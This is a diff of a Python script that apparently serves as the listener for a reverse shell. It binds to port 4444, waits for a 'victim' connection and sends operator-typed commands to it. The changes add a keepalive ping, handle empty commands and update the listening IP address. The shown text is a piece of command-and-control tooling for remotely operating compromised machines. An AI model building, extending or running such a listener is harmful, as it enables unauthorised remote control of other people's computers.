@@ -4,8 +4,9 @@ runmain = True
 
 def main():
     global runmain
+    pingtimer = 0
     runmain = False
-    my_ip = '25.108.125.219'
+    my_ip = '26.29.81.249'
     port = 4444
     server = socket.socket()
     server.bind((my_ip, port))
@@ -17,8 +18,15 @@ def main():
     connectionest = True
     while connectionest:
         try:
+            pingtimer += 1
+            print(pingtimer)
+            if pingtimer > 1000:
+                victim.send("ping".encode())
+                pingtimer = 0
+                print("ping")
             command = input('Enter Command : ')
-            if command == None:
+            if len(command) < 1:
+                print("Command cannot be null")
                 command = 'cd'
             if command == 'say' or command == 'python' or command == 'python3':
                 print('Command cancelled because the written command breaks connection.')
